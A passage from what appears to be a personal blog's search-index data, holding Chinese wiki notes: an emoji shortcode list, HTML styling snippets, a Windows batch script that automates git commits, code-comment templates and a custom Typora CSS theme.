:horse_racing: 🏂 :snowboarder: 🏊 :swimmer: 🏄 :surfer: 🎿 :ski: ♠️ :spades: ♥️ :hearts: ♣️ :clubs: ♦️ :diamonds: 💎 :gem: 💍 :ring: 🏆 :trophy: 🎼 :musical_score: 🎹 :musical_keyboard: 🎻 :violin: 👾 :space_invader: 🎮 :video_game: 🃏 :black_joker: 🎴 :flower_playing_cards: 🎲 :game_die: 🎯 :dart: 🀄️ :mahjong: 🎬 :clapper: 📝 :memo: 📝 :pencil: 📖 :book: 🎨 :art: 🎤 :microphone: 🎧 :headphones: 🎺 :trumpet: 🎷 :saxophone: 🎸 :guitar: 👞 :shoe: 👡 :sandal: 👠 :high_heel: 💄 :lipstick: 👢 :boot: 👕 :shirt: 👕 :tshirt: 👔 :necktie: 👚 :womans_clothes: 👗 :dress: 🎽 :running_shirt_with_sash: 👖 :jeans: 👘 :kimono: 👙 :bikini: 🎀 :ribbon: 🎩 :tophat: 👑 :crown: 👒 :womans_hat: 👞 :mans_shoe: 🌂 :closed_umbrella: 💼 :briefcase: 👜 :handbag: 👝 :pouch: 👛 :purse: 👓 :eyeglasses: 🎣 :fishing_pole_and_fish: ☕️ :coffee: 🍵 :tea: 🍶 :sake: 🍼 :baby_bottle: 🍺 :beer: 🍻 :beers: 🍸 :cocktail: 🍹 :tropical_drink: 🍷 :wine_glass: 🍴 :fork_and_knife: 🍕 :pizza: 🍔 :hamburger: 🍟 :fries: 🍗 :poultry_leg: 🍖 :meat_on_bone: 🍝 :spaghetti: 🍛 :curry: 🍤 :fried_shrimp: 🍱 :bento: 🍣 :sushi: 🍥 :fish_cake: 🍙 :rice_ball: 🍘 :rice_cracker: 🍚 :rice: 🍜 :ramen: 🍲 :stew: 🍢 :oden: 🍡 :dango: 🥚 :egg: 🍞 :bread: 🍩 :doughnut: 🍮 :custard: 🍦 :icecream: 🍨 :ice_cream: 🍧 :shaved_ice: 🎂 :birthday: 🍰 :cake: 🍪 :cookie: 🍫 :chocolate_bar: 🍬 :candy: 🍭 :lollipop: 🍯 :honey_pot: 🍎 :apple: 🍏 :green_apple: 🍊 :tangerine: 🍋 :lemon: 🍒 :cherries: 🍇 :grapes: 🍉 :watermelon: 🍓 :strawberry: 🍑 :peach: 🍈 :melon: 🍌 :banana: 🍐 :pear: 🍍 :pineapple: 🍠 :sweet_potato: 🍆 :eggplant: 🍅 :tomato: 🌽 :corn: Places 🏠 :house: 🏡 :house_with_garden: 🏫 :school: 🏢 :office: 🏣 :post_office: 🏥 :hospital: 🏦 :bank: 🏪 :convenience_store: 🏩 :love_hotel: 🏨 :hotel: 💒 :wedding: ⛪️ :church: 🏬 :department_store: 🏤 :european_post_office: 🌇 :city_sunrise: 🌆 :city_sunset: 🏯 :japanese_castle: 🏰 :european_castle: ⛺️ :tent: 🏭 :factory: 🗼 :tokyo_tower: 🗾 :japan: 🗻 :mount_fuji: 🌄 :sunrise_over_mountains: 🌅 :sunrise: 🌠 :stars: 🗽 :statue_of_liberty: 🌉 :bridge_at_night: 🎠 :carousel_horse: 🌈 :rainbow: 🎡 :ferris_wheel: ⛲️ :fountain: 🎢 :roller_coaster: 🚢 :ship: 🚤 :speedboat: ⛵️ :boat: ⛵️ :sailboat: 🚣 :rowboat: ⚓️ :anchor: 🚀 :rocket: ✈️ :airplane: 🚁 :helicopter: 🚂 :steam_locomotive: 🚊 :tram: 🚞 :mountain_railway: 🚲 :bike: 🚡 :aerial_tramway: 🚟 :suspension_railway: 🚠 :mountain_cableway: 🚜 :tractor: 🚙 :blue_car: 🚘 :oncoming_automobile: 🚗 :car: 🚗 :red_car: 🚕 :taxi: 🚖 :oncoming_taxi: 🚛 :articulated_lorry: 🚌 :bus: 🚍 :oncoming_bus: 🚨 :rotating_light: 🚓 :police_car: 🚔 :oncoming_police_car: 🚒 :fire_engine: 🚑 :ambulance: 🚐 :minibus: 🚚 :truck: 🚋 :train: 🚉 :station: 🚆 :train2: 🚅 :bullettrain_front: 🚄 :bullettrain_side: 🚈 :light_rail: 🚝 :monorail: 🚃 :railway_car: 🚎 :trolleybus: 🎫 :ticket: ⛽️ :fuelpump: 🚦 :vertical_traffic_light: 🚥 :traffic_light: ⚠️ :warning: 🚧 :construction: 🔰 :beginner: 🏧 :atm: 🎰 :slot_machine: 🚏 :busstop: 💈 :barber: ♨️ :hotsprings: 🏁 :checkered_flag: 🎌 :crossed_flags: 🏮 :izakaya_lantern: 🗿 :moyai: 🎪 :circus_tent: 🎭 :performing_arts: 📍 :round_pushpin: 🚩 :triangular_flag_on_post: 🇯🇵 :jp: 🇰🇷 :kr: 🇨🇳 :cn: 🇺🇸 :us: 🇫🇷 :fr: 🇪🇸 :es: 🇮🇹 :it: 🇷🇺 :ru: 🇬🇧 :gb: 🇬🇧 :uk: 🇩🇪 :de: Symbols 1️⃣ :one: 2️⃣ :two: 3️⃣ :three: 4️⃣ :four: 5️⃣ :five: 6️⃣ :six: 7️⃣ :seven: 8️⃣ :eight: 9️⃣ :nine: 🔟 :keycap_ten: 🔢 :1234: 0️⃣ :zero: #️⃣ :hash: 🔣 :symbols: ◀️ :arrow_backward: ⬇️ :arrow_down: ▶️ :arrow_forward: ⬅️ :arrow_left: 🔠 :capital_abcd: 🔡 :abcd: 🔤 :abc: ↙️ :arrow_lower_left: ↘️ :arrow_lower_right: ➡️ :arrow_right: ⬆️ :arrow_up: ↖️ :arrow_upper_left: ↗️ :arrow_upper_right: ⏬ :arrow_double_down: ⏫ :arrow_double_up: 🔽 :arrow_down_small: ⤵️ :arrow_heading_down: ⤴️ :arrow_heading_up: ↩️:leftwards_arrow_with_hook: ↪️ :arrow_right_hook: ↔️ :left_right_arrow: ↕️ :arrow_up_down: 🔼 :arrow_up_small: 🔃 :arrows_clockwise: 🔄 :arrows_counterclockwise: ⏪ :rewind: ⏩ :fast_forward: ℹ️ :information_source: 🆗 :ok: 🔀 :twisted_rightwards_arrows: 🔁 :repeat: 🔂 :repeat_one: 🆕 :new: 🔝 :top: 🆙 :up: 🆒 :cool: 🆓 :free: 🆖 :ng: 🎦 :cinema: 🈁 :koko: 📶 :signal_strength: 🈹 :u5272: 🈴 :u5408: 🈺 :u55b6: 🈯️ :u6307: 🈷️ :u6708: 🈶 :u6709: 🈵 :u6e80: 🈚️ :u7121: 🈸 :u7533: 🈳 :u7a7a: 🈲 :u7981: 🈂️ :sa: 🚻 :restroom: 🚹 :mens: 🚺 :womens: 🚼 :baby_symbol: 🚭 :no_smoking: 🅿️ :parking: ♿️ :wheelchair: 🚇 :metro: 🛄 :baggage_claim: 🉑 :accept: 🚾 :wc: 🚰 :potable_water: 🚮 :put_litter_in_its_place: ㊙️ :secret: ㊗️ :congratulations: Ⓜ️ :m: 🛂 :passport_control: 🛅 :left_luggage: 🛃 :customs: 🉐 :ideograph_advantage: 🆑 :cl: 🆘 :sos: 🆔 :id: 🚫 :no_entry_sign: 🔞 :underage: 📵 :no_mobile_phones: 🚯 :do_not_litter: 🚱 :non-potable_water: 🚳 :no_bicycles: 🚷 :no_pedestrians: 🚸 :children_crossing: ⛔️ :no_entry: ✳️ :eight_spoked_asterisk: ✴️ :eight_pointed_black_star: 💟 :heart_decoration: 🆚 :vs: 📳 :vibration_mode: 📴 :mobile_phone_off: 💹 :chart: 💱 :currency_exchange: ♈️ :aries: ♉️ :taurus: ♊️ :gemini: ♋️ :cancer: ♌️ :leo: ♍️ :virgo: ♎️ :libra: ♏️ :scorpius: ♐️ :sagittarius: ♑️ :capricorn: ♒️ :aquarius: ♓️ :pisces: ⛎ :ophiuchus: 🔯 :six_pointed_star: ❎:negative_squared_cross_mark: 🅰️ :a: 🅱️ :b: 🆎 :ab: 🅾️ :o2: 💠:diamond_shape_with_a_dot_inside: ♻️ :recycle: 🔚 :end: 🔛 :on: 🔜 :soon: 🕐 :clock1: 🕜 :clock130: 🕙 :clock10: 🕥 :clock1030: 🕚 :clock11: 🕦 :clock1130: 🕛 :clock12: 🕧 :clock1230: 🕑 :clock2: 🕝 :clock230: 🕒 :clock3: 🕞 :clock330: 🕓 :clock4: 🕟 :clock430: 🕔 :clock5: 🕠 :clock530: 🕕 :clock6: 🕡 :clock630: 🕖 :clock7: 🕢 :clock730: 🕗 :clock8: 🕣 :clock830: 🕘 :clock9: 🕤 :clock930: 💲 :heavy_dollar_sign: ©️ :copyright: ®️ :registered: ™️ :tm: ❌ :x: ❗️ :heavy_exclamation_mark: ‼️ :bangbang: ⁉️ :interrobang: ⭕️ :o: ✖️ :heavy_multiplication_x: ➕ :heavy_plus_sign: ➖ :heavy_minus_sign: ➗ :heavy_division_sign: 💮 :white_flower: 💯 :100: ✔️ :heavy_check_mark: ☑️ :ballot_box_with_check: 🔘 :radio_button: 🔗 :link: ➰ :curly_loop: 〰️ :wavy_dash: 〽️ :part_alternation_mark: 🔱 :trident: :black_square: :black_square: :white_square: :white_square: ✅ :white_check_mark: 🔲 :black_square_button: 🔳 :white_square_button: ⚫️ :black_circle: ⚪️ :white_circle: 🔴 :red_circle: 🔵 :large_blue_circle: 🔷 :large_blue_diamond: 🔶 :large_orange_diamond: 🔹 :small_blue_diamond: 🔸 :small_orange_diamond: 🔺 :small_red_triangle: 🔻 :small_red_triangle_down: span list12345678910111213141516171819202122231&lt;span class=&quot;fas faa-ring animated-hover&quot; style=&quot;border-bottom:3px solid green&quot;&gt;《半小时漫画中国哲学史》&lt;/span&gt;2&lt;span style=&quot;text-align:center;font-size:20px;font:30px 书体坊兰亭体;color:blueviolent;word-spacing:30px;&quot;&gt;“ 既许一人以偏爱，愿尽余生之慷慨 ”&lt;/span&gt;3&lt;span style=&quot;class: faa-bounce animated-hover;border-bottom: 5px solid #8F81EF;&quot;&gt;[data.json文件链接](https://pan.baidu.com/s/1omzU65YMpJr0jPPFItZ7SA )&lt;/span&gt; 4 &lt;mark style=&quot;background:royalBlue;border-bottom:lightblue 2px solid;color:white;font-family:consolas&quot;&gt;当使用重做日志文件来进行数据库恢复时，ORACLE将读取其中的重做记录(包括其中的修改向量)，并且将这些修改用于相关的块中。&lt;/mark&gt;5&lt;span style=&quot;background: PaleVioletRed;border-radius:10px;padding:1px 5px;color:white;font-weight:900&quot;&gt;存储结构管理主要就是通过对表空间的管理来实现的&lt;/span&gt;6&lt;mark style=&quot;background:green;border-radius:10px;color:white&quot;&gt;效果如下：&lt;/mark&gt;7&lt;font size=10px style=&quot;font-weight:700;font-family:&#x27;华文彩云&#x27;;color:rgb(100,190,100)&quot;&gt;基本语言(一)&lt;/font&gt;8&lt;span style=&quot;border-bottom: 2px dashed #000000&quot;&gt;代码段、数据段、BSS段、堆区、文件映射区以及栈区&lt;/span&gt;9&lt;div style=&quot;background:black;font:conloas;color:white;&quot;&gt;&amp;nbsp;数组长度为：3&lt;br&gt;&amp;nbsp;请按任意键继续. . .&lt;/div&gt;10&lt;mark style=&quot;color:white;background:red;font-weight:600;border_radius:100px&quot;&gt;但效率更高&lt;/mark&gt; 《半小时漫画中国哲学史》 “ 既许一人以偏爱，愿尽余生之慷慨 ” data.json文件链接 当使用重做日志文件来进行数据库恢复时，ORACLE将读取其中的重做记录(包括其中的修改向量)，并且将这些修改用于相关的块中。 存储结构管理主要就是通过对表空间的管理来实现的 效果如下： 基本语言(一) 代码段、数据段、BSS段、堆区、文件映射区以及栈区 &nbsp; 数组长度为：3 &nbsp; 请按任意键继续. . . 但效率更高 For the BadgeFor the Badge","tags":[{"name":"手册","slug":"手册","permalink":"http://example.com/tags/%E6%89%8B%E5%86%8C/"},{"name":"CSS","slug":"CSS","permalink":"http://example.com/tags/CSS/"}],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"}]},{"title":"Wiki自动更新脚本","date":"2023-10-27T01:24:02.489Z","path":"E_手册/个人配置/自动提交脚本/","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748@echo off:reInputecho Git自动更新脚本（输入序号选择命令）echo ===================================================================================echo 1 （:memo: 更新文档）echo 2 （:fire:）echo 3 （:wrench: 部署）echo 4 （:bug:）echo 5 （手动添加commit信息）echo ===================================================================================echo.echo=choice /c:12345 /m:&quot;请输入Git 数字命令更新变动：&quot;if %errorlevel% == 1 set change=&quot;:memo: 更新文档&quot;if %errorlevel% == 2 set change=&quot;:bug:&quot;if %errorlevel% == 3 set change=&quot;:wrench: 部署&quot;if %errorlevel% == 4 set change=&quot;:bug:&quot;if %errorlevel% == 5 set /p change=&quot;请输入Commit信息：&quot;if %change%==&quot;&quot; (clsecho -------echo 提交信息不能为空！echo -------goto reInput )echo.:: cd &quot;D:\\\\wiki\\\\&quot;git pullgit add .git commit -m %change%git pushecho.echo ===================================================================================echo 更新完毕echo.title &quot; update SUCCESS&quot;pause","tags":[{"name":"手册","slug":"手册","permalink":"http://example.com/tags/%E6%89%8B%E5%86%8C/"},{"name":"自定义","slug":"自定义","permalink":"http://example.com/tags/%E8%87%AA%E5%AE%9A%E4%B9%89/"},{"name":"Config","slug":"Config","permalink":"http://example.com/tags/Config/"}],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"个人配置","slug":"E-手册/个人配置","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/"}]},{"title":"函数声明","date":"2023-10-27T01:24:02.488Z","path":"E_手册/个人配置/函数文件TODO声明/","text":"函数声明123456789/** @fn $MethodName$* @brief * @param[in] * @param[out] * @return * * @detail */ 文件声明1234567891011/******************************************************************************** * * Copyright (C) 2022 QIANXIN * All rights reserved * * filename: $FILE$ * description: * * created by shi.mingming on $DATE$ * ********************************************************************************/ TODO1// TODO(shimingming@qianxin.com): what: when:? how:？","tags":[{"name":"手册","slug":"手册","permalink":"http://example.com/tags/%E6%89%8B%E5%86%8C/"},{"name":"配置","slug":"配置","permalink":"http://example.com/tags/%E9%85%8D%E7%BD%AE/"}],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"个人配置","slug":"E-手册/个人配置","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/"}]},{"title":"typora bluebook 自定义修改主题代码","date":"2023-10-27T01:24:02.487Z","path":"E_手册/个人配置/typora主题自定义/","text":"说明 修改了目录中 代码块 的颜色 修改了编辑页面的最小宽度 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000100110021003100410051006100710081009101010111012101310141015101610171018101910201021102210231024102510261027102810291030103110321033103410351036103710381039104010411042104310441045104610471048104910501051105210531054105510561057105810591060106110621063106410651066106710681069107010711072107310741075107610771078107910801081108210831084108510861087108810891090109110921093109410951096109710981099110011011102110311041105110611071108110911101111111211131114111511161117111811191120112111221123112411251126112711281129113011311132113311341135@charset &quot;UTF-8&quot;;/* 自定义表格 */tr.md-end-block:hover &#123; background-color: dodgerblue; font-weight: 700; color: white;&#125;/*** Custom fonts ***/@import url(&#x27;./blubook/fonts.css&#x27;);/*** Color setting ***/:root &#123; --side-bar-bg-color: #183055; --active-file-bg-color: #2f4566; --active-file-text-color: #ffffff; --active-file-border-color: #757575; --active-search-item-bg-color: #23242b; --item-hover-bg-color: #ececec; --item-hover-text-color: #000000; --control-text-color: #ddd; --window-border: 1px solid #183055; --code-cursor: #f0f0f0;&#125;/*** Btn in search bar ***/#filesearch-case-option-btn,#filesearch-word-option-btn &#123; background: var(--side-bar-bg-color);&#125;/****** #write basic ******/#write &#123; position: static; width: 90%; min-width: 90%; max-width: 700px; line-height: 1.6; transform: none; height: auto;&#125;/****** #write h1-h6 ******/#write h1,#write h2,#write h3,#write h4,#write h5,#write h6,#write p,#write pre &#123; width: auto;&#125;#write h1::before,#write h2::before,#write h3::before,#write h4::before,#write h5::before,#write h6::before &#123; position: absolute; right: calc(100% + 10px); bottom: 0; color: #b4b4b4; font-size: 1rem; font-weight: bold; font-variant: &#x27;small-caps&#x27;; border: 0; border-radius: 0; left: auto; float: none; padding: 0;&#125;#write h1 &#123; font-size: 2.2rem; font-style: normal; font-weight: 800; line-height: 2; margin-top: 14px; margin-bottom: 14px;&#125;#write h1::before &#123; content: &#x27;H1&#x27;; bottom: 1rem;&#125;#write h2 &#123; font-size: 2rem; font-weight: 800; font-style: normal; line-height: 2; margin-top: 14px; margin-bottom: 14px;&#125;#write h2::before &#123; content: &#x27;H2&#x27;; bottom: .85rem;&#125;#write h3 &#123; font-size: 1.6rem; font-weight: 800; line-height: 2; font-style: normal; margin-top: 14px; margin-bottom: 14px;&#125;#write h3::before &#123; content: &#x27;H3&#x27;; top: .44rem; padding: 3px 0 3px 0;&#125;#write h4 &#123; font-size: 1.4rem; font-weight: 800; line-height: 2; font-style: normal; margin-top: 14px; margin-bottom: 14px;&#125;#write h4::before &#123; content: &#x27;H4&#x27;; top: .4rem;&#125;#write h5,#write h6 &#123; font-size: 1.2rem; font-weight: 800; line-height: 2; font-style: normal; margin-top: 14px; margin-bottom: 14px;&#125;#write h5::before,#write h6::before &#123; top: .2rem;&#125;#write h5::before &#123; content: &#x27;H5&#x27;;&#125;#write h6::before &#123; content: &#x27;H6&#x27;;&#125;h3.md-focus:before,h4.md-focus:before,h5.md-focus:before,h6.md-focus:before &#123; color: #ddd; color: var(--heading-char-color); border: 1px solid; border-radius: 3px; position: absolute; left: -1.642857143rem; top: .357142857rem; float: left; font-size: 9px; padding-left: 2px; padding-right: 2px; vertical-align: bottom; font-weight: 400; line-height: 2;&#125;/****** Global Style ******/body &#123; margin: 0; font-family: &#x27;Glow Sans SC&#x27;, -apple-system, sans-serif; font-weight: 500; text-rendering: geometricPrecision; -webkit-font-smoothing: antialiased; -webkit-text-size-adjust: 100%&#125;html,body &#123; color: #242A31; /* width: 100%; */ height: 100%; margin: 0; padding: 0; font-size: 14px; background: #ffffff; box-sizing: border-box; line-height: 1rem; text-size-adjust: 100%; -moz-osx-font-smoothing: grayscale; -webkit-text-size-adjust: 100%;&#125;hr &#123; border-color: #e6ecf1; height: 2px; border-top: 2px solid #e6ecf1;&#125;img &#123; max-width: 80%; margin-top: 0.2rem; margin-bottom: 0.2rem;&#125;/****** ul ol Style ******/ul&gt;li&gt;ul&gt;li &#123; list-style-type: circle;&#125;ul&gt;li&gt;ul&gt;li&gt;ul&gt;li &#123; list-style-type: square;&#125;ol,ul &#123; padding-left: 2rem; line-height: 1;&#125;ol&gt;li &#123; list-style-type: decimal&#125;ol&gt;li&gt;ol&gt;li &#123; list-style-type: lower-alpha&#125;ol&gt;li&gt;ol&gt;li&gt;ol&gt;li &#123; list-style-type: lower-roman&#125;/****** Table Style ******/table &#123; padding: 0; word-break: initial;&#125;table tr &#123; border-top: 1px solid #dfe2e5; margin: 0; padding: 0;&#125;table tr:nth-child(2n),thead &#123; background-color: #f5f7f9;&#125;table tr th &#123; font-weight: bold; border: 1px solid #dfe2e5; border-bottom: 0; margin: 0; padding: 6px 13px;&#125;table tr td &#123; border: 1px solid #dfe2e5; margin: 0; padding: 6px 13px;&#125;table tr th:first-child,table tr td:first-child &#123; margin-top: 0;&#125;table tr th:last-child,table tr td:last-child &#123; margin-bottom: 0;&#125;/****** YAML Style ******/pre.md-meta-block &#123; font-size: .85rem !important; color: #5d5d5d; min-height: .8rem; white-space: pre-wrap; background: #f5f7f9; display: block; overflow-x: hidden; padding: 1rem; border-radius: 8px;&#125;/****** Global Text ******/p &#123; font-size: 16px; font-family: &quot;Glow Sans SC&quot;, -apple-system, sans-serif; font-weight: 500; line-height: 1.6; font-style: normal; color: rgb(59, 69, 78);&#125;a &#123; /* color: rgb(164, 78, 237); */ color: rgb(56, 132, 254); font-weight: 500; text-decoration: none; text-decoration-style: none; cursor: pointer; padding: 0 3px 0 3px;&#125;#write a:hover &#123; color: rgb(56, 132, 254); text-decoration: underline; text-decoration-style: solid;&#125;strong &#123; font-weight: 700;&#125;mark &#123; background: #87CEFA; padding: 0 2px 0 2px; margin: 0 2px 0 2px;&#125;h1 &#123; font-size: 2rem; font-style: normal; font-weight: 800; line-height: 2; margin-top: 14px; margin-bottom: 14px;&#125;h2 &#123; font-size: 1.8rem; font-weight: 800; font-style: normal; line-height: 2; margin-top: 14px; margin-bottom: 14px;&#125;h3 &#123; font-size: 1.6rem; font-weight: 800; line-height: 2; font-style: normal; margin-top: 14px; margin-bottom: 14px;&#125;h4 &#123; font-size: 1.2rem; font-weight: 800; line-height: 2; font-style: normal; margin-top: 14px; margin-bottom: 14px;&#125;h5,h6 &#123; font-size: 1rem; font-weight: 800; line-height: 2; font-style: normal; margin-top: 14px; margin-bottom: 14px;&#125;/****** Print header ******/@media print &#123; .typora-export * &#123; -webkit-print-color-adjust: exact; &#125; #write h1::before &#123; content: &#x27;&#x27;; bottom: 1rem; &#125; #write h2::before &#123; content: &#x27;&#x27;; bottom: 1rem; &#125; #write h3::before &#123; content: &#x27;&#x27;; bottom: 1rem; &#125; #write h4::before &#123; content: &#x27;&#x27;; bottom: 1rem; &#125; #write h5::before &#123; content: &#x27;&#x27;; bottom: 1rem; &#125; #write h6::before &#123; content: &#x27;&#x27;; bottom: 1rem; &#125;&#125;/****** #write Code Fences ******/#write .md-fences &#123; -webkit-font-smoothing: initial; margin: 1rem 0 1rem 0 !important; line-height: 1.43rem; border-radius: 3px; font-size: 0.95rem; word-wrap: normal;&#125;#write .CodeMirror-wrap .CodeMirror-code pre &#123; padding-left: 30px; line-height: 1.55rem;&#125;#write .CodeMirror-cursors .CodeMirror-cursor &#123; border-left: 2px solid var(--code-cursor);&#125;#write code,tt &#123; margin: 0 2px; padding: 4px 6px; border-radius: 6px; font-size: 0.92rem !important; background: #f5f7f9; display: inline; vertical-align: bottom; line-height: 1.8;&#125;#write .md-footnote &#123; color: var(--main-5); background-color: var(--main-1);&#125;.cm-s-inner.CodeMirror,.cm-s-inner .CodeMirror-gutters &#123; padding: 0.75rem 0.15rem 0.75rem 0.15rem; background-color: #183055 !important; color: #f8f8f2 !important; border: none; border-radius: 6px;&#125;.code-tooltip &#123; box-shadow: 0 1px 1px 0 rgba(0, 28, 36, .3); border-top: 1px solid #eef2f2; background: #183055; border-radius: 6px;&#125;.md-fences &#123; font-size: .9rem; position: relative !important; display: block; page-break-inside: avoid; text-align: left; overflow: visible; white-space: pre; background: inherit;&#125;.md-fences &#123; background-color: #f8f8f8; margin-bottom: 15px; margin-top: 15px; padding-top: 8px; padding-bottom: 6px;&#125;.md-fences,tt &#123; border-radius: 3px; /* color: #f0f0f0; */ padding: 0; font-size: 0.9rem;&#125;/****** Sidebar ******/#typora-sidebar * &#123; /* color: #f0f0f0; */ color: white;&#125;code &#123; color: #3399CC!important; font-weight: 700;&#125;#typora-sidebar .file-tree-node.file-library-file-node.active .file-node-background &#123; border-left: 5px solid #3884ff; height: 2.2rem;&#125;#sidebar-files-menu &#123; border: 1px solid rgba(0, 2, 3, 0.7);&#125;.file-list-item &#123; border-bottom: var(--window-border);&#125;.file-list-item &#123; overflow: hidden; padding: 12px; border-bottom: 1px solid #eee; border-bottom: var(--window-border); cursor: pointer; padding-right: 8px; padding-top: 12px; padding-left: 24px; transition: top .5s; -webkit-transition: top .5s;&#125;.file-list-item.active &#123; background: #2f4566; /* background: var(--active-file-bg-color); */ color: var(--active-file-text-color); border-radius: 12px;&#125;.file-list-item:not(.active) &#123; opacity: .9;&#125;.file-node-content &#123; padding-top: 6px; margin: 0 0 8px 0; cursor: default; color: var(--control-text-color); white-space: nowrap; height: 2.2rem; line-height: 1.5;&#125;.ty-on-drag-enter &#123; background-color: #2f4566; color: var(--item-hover-text-color);&#125;.file-node-content:active &#123; border-radius: 0px !important; background: #2f4566;&#125;.active .file-node-content &#123; font-weight: bold;&#125;.file-node-content:hover &#123; cursor: pointer; border-radius: 0px !important;&#125;.file-node-icon,.file-node-open-state &#123; display: block; float: left; line-height: 1.5; min-height: 15px;&#125;.file-node-icon &#123; margin-right: 6px;&#125;.file-list-item-file-name &#123; font-weight: 700; margin-bottom: 3px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; width: 100%; line-height: 2;&#125;.sidebar-footer &#123; background: var(--side-bar-bg-color); border-top: 1px #555 solid;&#125;.html-for-mac #file-library-search-input &#123; border: 0; border-bottom: 1px solid #ccc; line-height: 16px; margin: 5px 16px 0px 0; width: 0; /* -webkit-flex: 1; */ flex: 1; background: 0 0; color: #bbc0ca !important; /* transform: translateY(-3px); */ /* overflow: auto; */ padding-top: 6px;&#125;#typora-sidebar #ty-sidebar-footer .sidebar-footer-item:hover &#123; background: #021d43;&#125;#typora-sidebar #outline-content .outline-item:hover &#123; background: #202020;&#125;#typora-sidebar #ty-sidebar-footer #sidebar-files-menu .show+.menuitem-group-label.show &#123; border-color: #202020;&#125;#typora-sidebar #ty-sidebar-footer &#123; border-top: 1px solid #19191c;&#125;#typora-sidebar #ty-sidebar-footer #sidebar-files-menu li&gt;a:hover &#123; background: #021d43;&#125;#typora-sidebar #ty-sidebar-footer #sidebar-files-menu .ty-side-sort-btn.active,#typora-sidebar #ty-sidebar-footer #sidebar-files-menu .ty-side-sort-btn:hover &#123; color: #3884FF;&#125;#typora-sidebar #ty-sidebar-footer #sidebar-files-menu .ty-side-sort-btn.active &#123; background: #001129;&#125;#typora-sidebar .file-list-item.file-library-node:not(.active):hover &#123; background: #243959; border-radius: 12px;&#125;#typora-sidebar .file-tree-node.file-library-file-node:not(.active):hover .file-node-background &#123; background: #243959; border-radius: 12px; height: 2.2rem;&#125;/****** Quote style ******/blockquote &#123; position: relative; /* margin: 1rem 1 1rem 2rem; */ padding: 1rem; color: #827676; background-color: #f5f7f9; border-radius: 6px; line-height: 1;&#125;blockquote::before &#123; content: &#x27;&#x27;; position: absolute; top: 0rem; left: 0rem; height: 100%; width: .30rem; background: #3884ff; border-top-left-radius: 6px; border-bottom-left-radius: 6px;&#125;/****** task list style ******/.task-list &#123; padding-left: 0;&#125;.md-task-list-item&gt;input &#123; top: -0.2rem; margin-left: -1.6rem; margin-top: calc(1rem + 1px); -webkit-appearance: initial;&#125;.md-task-list-item&gt;input:before &#123; border: 1px solid#0185ff; border-radius: 1rem; width: 1rem; height: 1rem; background: #fff; content: &#x27; &#x27;; transition: background-color 200ms ease-in-out; display: block;&#125;.md-task-list-item&gt;input:checked:before,.md-task-list-item&gt;input[checked]:before &#123; background: #0185ff; border-width: 1px; transition: background-color 200ms ease-in-out;&#125;.md-task-list-item&gt;input:checked:after,.md-task-list-item&gt;input[checked]:after &#123; opacity: 1;&#125;.md-task-list-item&gt;input:after &#123; opacity: 1; -webkit-transition: opacity 0.05s ease-in-out; -moz-transition: opacity 0.05s ease-in-out; transition: opacity 0.05s ease-in-out; -webkit-transform: rotate(-45deg); -moz-transform: rotate(-45deg); transform: rotate(-45deg); position: absolute; top: 0.25rem; left: 0.19rem; width: 0.6rem; height: 0.375rem; border: 2px solid #fff; border-top: 0; border-right: 0; content: &#x27; &#x27;; opacity: 0;&#125;/****** Source style ******/.typora-sourceview-on #write &#123; display: none&#125;#typora-source &#123; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background-color: inherit; padding-right: 0; padding-left: 0; padding-top: 0; display: none; line-height: 1.5&#125;.mac-seamless-mode #typora-source &#123; top: 20px&#125;#typora-source .CodeMirror &#123; height: 100%; overflow-x: hidden&#125;#typora-source .CodeMirror-gutters &#123; left: initial !important&#125;#typora-source .CodeMirror-lines &#123; padding-top: 30px; padding-bottom: 60px; padding-left: 60px; padding-right: 30px; max-width: 800px; margin: 0 auto&#125;#typora-source .CodeMirror-wrap .CodeMirror-scroll &#123; overflow-y: auto&#125;.CodeMirror-activeline .cm-trailing-space-new-line:after &#123; opacity: .6&#125;.CodeMirror-activeline .cm-starttab .cm-tab:after &#123; background: 